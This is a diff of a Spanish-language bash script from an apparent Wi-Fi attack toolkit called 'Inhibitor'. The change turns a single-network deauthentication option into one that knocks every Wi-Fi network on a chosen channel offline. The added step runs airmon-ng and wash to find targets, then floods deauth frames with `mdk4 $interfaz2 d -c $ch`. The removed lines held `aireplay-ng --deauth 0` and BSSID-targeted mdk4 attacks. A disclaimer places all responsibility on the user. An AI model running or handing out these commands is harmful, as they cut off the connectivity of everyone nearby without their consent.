@@ -15,7 +15,7 @@ echo "          Cualquier acción y o actividad relacionada con Inhibitor es ún
 echo "          -------------------------------------------------------------------------------------------"
 echo
 echo
-echo "[7] Desconectar a todos los dispositivos de una Red Wifi"
+echo "[8] Desconectar a todas las Redes Wifi de un Canal"
 echo 
 sudo airmon-ng
 echo
@@ -77,76 +77,37 @@ echo "          Cualquier acción y o actividad relacionada con Inhibitor es ún
 echo "          -------------------------------------------------------------------------------------------"
 echo
 echo
-echo "[#] Pulse Ctrl + c (Cuando aparezca por pantalla el Wifi objetivo, puede tardar hasta 1 minuto)"
+echo "[#] Pulse Ctrl + c (Cuando aparezca por pantalla el Canal objetivo, puede tardar hasta 1 minuto)"
 echo
 sudo wash -2 -5 -a -i $interfaz2
-read -p "[*] Copia el BSSID del Wifi Objetivo y pegelo a continuacion: " bssid
-read -p "[*] Copia el Canal (Ch) del Wifi Objetivo y pegelo a continuacion: " ch
-echo
-echo "================="
-echo "[1] Wifi 2,4GHz"
-echo "[2] Wifi 5GHz"
-echo "================="
-echo
-read -p "Que banda Wifi utiliza su Objetivo: " opc2
-	case $opc2 in
-			1 )	clear
-				echo
-				echo "                           _____           _       _   _       _   _                  "
-				echo "                          |_   _|         | |     (_) | |     (_) | |                 "
-				echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
-				echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
-				echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
-				echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
-				echo "                              __________________________________________________"					
-				echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
-				echo "          -------------------------------------------------------------------------------------------"
-				echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
-				echo "          -------------------------------------------------------------------------------------------"
-				echo
-				echo
-				echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y Todos los usuarios se reconecten al Wifi)"
-				echo
-				echo
-				echo "========================================================================================="
-				echo "                      El Objetivo ($bssid) esta siendo Atacado"
-				echo "========================================================================================="
-				echo
-				sudo aireplay-ng --deauth 0 -a $bssid $interfaz2
-				echo
-				echo
-				;;
-			2 )	clear
-				echo
-				echo "                           _____           _       _   _       _   _                  "
-				echo "                          |_   _|         | |     (_) | |     (_) | |                 "
-				echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
-				echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
-				echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
-				echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
-				echo "                              __________________________________________________"					
-				echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
-				echo "          -------------------------------------------------------------------------------------------"
-				echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
-				echo "          -------------------------------------------------------------------------------------------"
-				echo
-				echo
-				echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y Todos los usuarios se reconecten al Wifi)"
-				echo
-				echo
-				echo "========================================================================================="
-				echo "                      El Objetivo ($bssid) esta siendo Atacado"
-				echo "========================================================================================="
-				echo
-				sudo mdk4 $interfaz2 d -B $bssid -c $ch
-				echo
-				echo
-				;;
-			* )	echo
-				echo "$RRPLY No es una opcion valida"
-	esac
-
+read -p "[*] Copia el Canal (Ch) Objetivo y pegelo a continuacion: " ch
 sleep 1
+echo "Listo"
+sleep 1
+clear
+echo
+echo "                           _____           _       _   _       _   _                  "
+echo "                          |_   _|         | |     (_) | |     (_) | |                 "
+echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
+echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
+echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
+echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
+echo "                              __________________________________________________"					
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
+echo "          -------------------------------------------------------------------------------------------"
+echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
+echo "          -------------------------------------------------------------------------------------------"
+echo
+echo
+echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y Todos los usuarios se reconecten a las Redes Wifi)"
+echo
+echo "========================================================================================="
+echo "                           El Canal ($ch) esta siendo Atacado"
+echo "========================================================================================="
+echo
+sudo mdk4 $interfaz2 d -c $ch
+sleep 1
+echo
 echo
 echo "=============================="
 echo "        Desactivando"
@@ -182,7 +143,7 @@ read -p "Elige una opcion: " opc3
 	case $opc3 in
 			1 )	bash inhibitor.sh
 				;;
-			2 )	bash requisitos/7.sh
+			2 )	bash requisitos/8.sh
 				;;
 			3 )	exit && clear
 				;;
